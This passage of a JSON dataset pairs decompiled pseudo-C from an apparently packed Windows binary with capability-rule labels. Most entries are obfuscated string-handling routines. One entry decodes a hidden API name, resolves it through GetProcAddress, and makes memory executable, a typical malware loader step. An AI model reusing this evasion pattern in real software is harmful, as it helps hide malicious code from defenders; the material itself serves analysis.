        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040560f(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff2c;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c110;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    pcStack136 = \"jyxoxpqmggljgiowjpunwuryqvjmekimrvkbpnhdqibr\";\n    auStack144[0] = 0x2c;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x2b, iStack60, \"blghittuyonjipsvhmzxzbwsasvlzajgputoounqnvf\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x2b, uStack84, \"blghittuyonjipsvhmzxzbwsasvlzajgputoounqnvf\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x2b, uStack36, \"blghittuyonjipsvhmzxzbwsasvlzajgputoounqnvf\");\n    if (uStack64 < 0x10) {\ncode_r0x00421e47:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00422108;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x2c, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \n                     \"jyxoxpqmggljgiowjpunwuryqvjmekimrvkbpnhdqibr\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x2c, uStack36, \"jyxoxpqmggljgiowjpunwuryqvjmekimrvkbpnhdqibr\");\n        if (0xf < uStack64) {\n            in_stack_ffffff2c = uStack64 + 1;\n            uVar2 = uStack84;\n            if (0xfff < in_stack_ffffff2c) {\n                uVar2 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar2) goto code_r0x00422114;\n                in_stack_ffffff2c = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff2c = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff2c) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00422120;\n                in_stack_ffffff2c = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x2c, in_stack_ffffff2c & 0xffffff00 | uStack84 & 0xff, \n                     \"jyxoxpqmggljgiowjpunwuryqvjmekimrvkbpnhdqibr\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x2c, uStack36, \"jyxoxpqmggljgiowjpunwuryqvjmekimrvkbpnhdqibr\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x0042212c;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x00422138;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x00422144;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack112) {\n            iVar3 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar3 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar3))\n            goto code_r0x00422150;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x1377b;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x00421e3b:\n        fcn.00401a32(uVar2);\n        goto code_r0x00421e47;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x00421e3b;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00422108:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00422114:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00422120:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042212c:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00422138:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00422144:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00422150:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 2102
    },
    "0040565f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.0040565f(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    int32_t aiStack84 [4];\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack84;\n    uStack24 = 0x44cd60;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    aiStack84[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x60);\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x5b, uStack36, \n                 \"rnuggnwmdwwddltndczepadkzrubjwkwszrmilnqebahfhukekhhywiuioeepydgffxcjbdrzzxtortranrqxrejrxx\");\n    if (uStack40 < 0x10) {\ncode_r0x00447967:\n        if (0xf < uStack64) {\n            iVar1 = aiStack84[0];\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(aiStack84[0] + -4),  0x1f < (aiStack84[0] + -4) - iVar1))\n            goto code_r0x00447a43;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar1 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar1 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar1)) goto code_r0x00447a4f;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000050) {\n            iVar1 = in_stack_0000003c;\n            if ((0xfff < in_stack_00000050 + 1) &&\n               (iVar1 = *(in_stack_0000003c + -4),  0x1f < (in_stack_0000003c + -4) - iVar1)) goto code_r0x00447a5b;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(iStack60 + -4),  (iStack60 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00447967;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00447a43:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00447a4f:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00447a5b:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 920
    },
    "004056be": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004056be(int32_t param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    int32_t in_stack_00000068;\n    uint32_t in_stack_0000007c;\n    uint32_t in_stack_ffffff20;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44ce50;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 0xb;\n    pcStack160 = \"rvafvpssjxjvaqreewaft\";\n    auStack168[0] = 0x15;\n    fcn.00402f72();\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x1c, iStack108, \"fuxfwukzklperqbgtdilxbbudkng\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x56, iStack60, \n                 \"uygribfxidklcfjackfyqkhixhxheailqzpvlxdcjtqvczysrhtogdlumqpzfolacggmjbobpxhmvmunbwbxjb\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x15, uStack84, \"rvafvpssjxjvaqreewaft\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0x10;\n    fcn.00402f72(0x15, uStack36, \"rvafvpssjxjvaqreewaft\");\n    if (uStack64 < 0x10) {\ncode_r0x0044b20e:\n        if (0xf < uStack40) {\n            in_stack_ffffff20 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff20) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0044b53e;\n                in_stack_ffffff20 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xe;\n        fcn.00402f72(0x56, in_stack_ffffff20 & 0xffffff00 | uStack84 & 0xff, \n                     \"uygribfxidklcfjackfyqkhixhxheailqzpvlxdcjtqvczysrhtogdlumqpzfolacggmjbobpxhmvmunbwbxjb\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xf;\n        fcn.00402f72(0x56, uStack36, \n                     \"uygribfxidklcfjackfyqkhixhxheailqzpvlxdcjtqvczysrhtogdlumqpzfolacggmjbobpxhmvmunbwbxjb\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x0044b54a;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x0044b556;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x0044b562;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack112) {\n            iVar3 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar3 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar3))\n            goto code_r0x0044b56e;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack136) {\n            iVar3 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar3 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar3))\n            goto code_r0x0044b57a;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar3 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar3 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar3))\n            goto code_r0x0044b586;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar3 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar3 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar3)) goto code_r0x0044b592;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000050) {\n            iVar3 = in_stack_0000003c;\n            if ((0xfff < in_stack_00000050 + 1) &&\n               (iVar3 = *(in_stack_0000003c + -4),  0x1f < (in_stack_0000003c + -4) - iVar3)) goto code_r0x0044b59e;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_0000007c) {\n            iVar3 = in_stack_00000068;\n            if ((0xfff < in_stack_0000007c + 1) &&\n               (iVar3 = *(in_stack_00000068 + -4),  0x1f < (in_stack_00000068 + -4) - iVar3)) goto code_r0x0044b5aa;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0xfd11;\n    }\n    in_stack_ffffff20 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff20 < 0x1000) {\ncode_r0x0044b202:\n        fcn.00401a32(uVar2);\n        goto code_r0x0044b20e;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff20 = uStack64 + 0x24;\n        goto code_r0x0044b202;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0044b53e:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0044b54a:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0044b556:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0044b562:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0044b56e:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0044b57a:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0044b586:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x0044b592:\n    uStack20 = 8;\n    fcn.004047f5();\ncode_r0x0044b59e:\n    uStack20 = 9;\n    fcn.004047f5();\ncode_r0x0044b5aa:\n    uStack20 = 10;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 2511
    },
    "004057ea": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.004057ea(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t in_stack_0000004c;\n    uint32_t in_stack_00000060;\n    uint32_t in_stack_ffffff50;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack92;\n    uint uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44cc10;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 8;\n    pcStack136 = \"qsmvbefbevuudzxdotlpgyuhytpqjqsejrokqjjjcubotuu\";\n    auStack144[0] = 0x2f;\n    fcn.00402f72();\n    uStack88 = 0xf;\n    uStack92 = 0xb;\n    uStack108 = 0x6b697579;\n    uStack104 = 0x61636272;\n    uStack100 = 0x786d72;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x2f, uStack60, \"qsmvbefbevuudzxdotlpgyuhytpqjqsejrokqjjjcubotuu\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    uStack60 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x2f, uStack36, \"qsmvbefbevuudzxdotlpgyuhytpqjqsejrokqjjjcubotuu\");\n    if (uStack40 < 0x10) {\ncode_r0x004434b4:\n        if (0xf < uStack64) {\n            in_stack_ffffff50 = uStack64 + 1;\n            iVar2 = iStack84;\n            if (0xfff < in_stack_ffffff50) {\n                iVar2 = *(iStack84 + -4);\n                if (0x1f < (iStack84 + -4) - iVar2) goto code_r0x0044371d;\n                in_stack_ffffff50 = uStack64 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack68 = 0;\n        uStack64 = 0xf;\n        iStack84 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x2f, in_stack_ffffff50 & 0xffffff00 | uStack60 & 0xff, \n                     \"qsmvbefbevuudzxdotlpgyuhytpqjqsejrokqjjjcubotuu\");\n        uStack44 = 0;\n        uStack40 = 0xf;\n        uStack60 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x2f, uStack36, \"qsmvbefbevuudzxdotlpgyuhytpqjqsejrokqjjjcubotuu\");\n        if (0xf < uStack40) {\n            uVar1 = uStack60;\n            if ((0xfff < uStack40 + 1) && (uVar1 = *(uStack60 - 4),  0x1f < (uStack60 - 4) - uVar1))\n            goto code_r0x00443729;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00443735;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00443741;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x0044374d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar2 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) goto code_r0x00443759;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000060) {\n            iVar2 = in_stack_0000004c;\n            if ((0xfff < in_stack_00000060 + 1) &&\n               (iVar2 = *(in_stack_0000004c + -4),  0x1f < (in_stack_0000004c + -4) - iVar2)) goto code_r0x00443765;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542864;\n    }\n    in_stack_ffffff50 = uStack40 + 1;\n    uVar1 = uStack60;\n    if (in_stack_ffffff50 < 0x1000) {\ncode_r0x004434a8:\n        fcn.00401a32(uVar1);\n        goto code_r0x004434b4;\n    }\n    uVar1 = *(uStack60 - 4);\n    if ((uStack60 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff50 = uStack40 + 0x24;\n        goto code_r0x004434a8;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0044371d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00443729:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00443735:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00443741:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0044374d:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00443759:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00443765:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 1954
    },
    "0040585d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.0040585d(uint *param_1, uint param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t aiStack88 [4];\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack88;\n    uStack24 = 0x44c560;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack44 = 0xf;\n    uStack48 = 2;\n    iStack64 = 0x6d6a;\n    uStack72 = 0;\n    uStack68 = 0xf;\n    aiStack88[0] = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x31);\n    puStack40[5] = 0xf;\n    puStack40[4] = 3;\n    *puStack40 = 0x666164;\n    if (uStack68 < 0x10) {\ncode_r0x0042fff2:\n        if (0xf < uStack44) {\n            iVar2 = iStack64;\n            if ((0xfff < uStack44 + 1) && (iVar2 = *(iStack64 + -4),  0x1f < (iStack64 + -4) - iVar2))\n            goto code_r0x0043011d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x00430129;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar2 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar2 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar2)) goto code_r0x00430135;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar2 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar2 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar2)) goto code_r0x00430141;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = aiStack88[0];\n    if ((uStack68 + 1 < 0x1000) || (iVar2 = *(aiStack88[0] + -4),  (aiStack88[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042fff2;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043011d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00430129:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00430135:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00430141:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1084
    },
    "004058cb": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004058cb(uint param_1, uint param_2, int32_t param_3, uint param_4, uint param_5, uint32_t param_6, \n                     int32_t param_7, uint32_t param_8, int32_t param_9, uint32_t param_10, int32_t param_11)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_00000050;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    uint32_t in_stack_00000074;\n    int32_t iStack76;\n    uchar uStack72;\n    uint uStack71;\n    uint uStack67;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = &iStack76;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x4147f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uVar6 = param_3 * 0x101c;\n    uVar1 = uVar6 * param_6;\n    uVar2 = param_8 * 0xfffffe64;\n    uVar7 = uVar1 + param_10;\n    fcn.00404c19(uVar7 + uVar2, \n                 uVar6 * param_7 + (uVar6 * param_6 >> 0x20) + (uVar6 >> 0x1f) * param_6 + param_11 +\n                 CARRY4(uVar1, param_10) + param_9 * -0x19c + ((param_8 * 0xfffffe64 >> 0x20) - param_8) +\n                 CARRY4(uVar7, uVar2));\n    uStack40 = CONCAT13(uStack40._3_1_, 0x684892);\n    uStack44 = 0x92a51808;\n    uStack48 = 0x41ac955b;\n    uStack52 = 0x88cb97c1;\n    uVar5 = 0xc1;\n    for (iVar3 = 1; uVar5 = ((uVar5 ^ 0x10) >> 2 | uVar5 << 6) - 0x2a, \n        uVar5 = ((-(uVar5 * ' ' | uVar5 >> 3) ^ 99) - 0x29 ^ 0x14) + iVar3, \n        uVar5 = (uVar5 * '\\x04' | uVar5 >> 6) ^ 0x9d,  *(&uStack56 + iVar3 + 3) = uVar5 + 0xe >> 1 | uVar5 << 7, \n        iVar3 != 0xf; iVar3 = iVar3 + 1) {\n        uVar5 = *(&uStack52 + iVar3);\n    }\n    uStack56 = 0xf;\n    iStack76 = 0x6e72656b;\n    uStack72 = 0x65;\n    uStack60 = 0xc;\n    uStack71 = 0x2e32336c;\n    uStack67 = 0x6c6c64;\n    uStack20 = 1;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&iStack76);\n    uStack36 = 0;\n    *0x56eba8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4, &uStack52);\n    (**0x56eba8)(param_1, param_2, 0x40, &uStack36);\n    if (0xf < uStack56) {\n        iVar3 = iStack76;\n        if ((0xfff < uStack56 + 1) && (iVar3 = *(iStack76 + -4),  0x1f < (iStack76 + -4) - iVar3)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            uVar1 = fcn.00403a76();\n            return uVar1;\n        }\n        fcn.00401a32(iVar3);\n    }\n    uVar1 = fcn.00404782(in_stack_00000050, 0, in_stack_00000058, in_stack_0000005c);\n    *in_FS_OFFSET = piStack28;\n    return uVar1 ^ in_stack_00000074;\n}\n",
        "token_count": 1118
    },
    "00405975": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
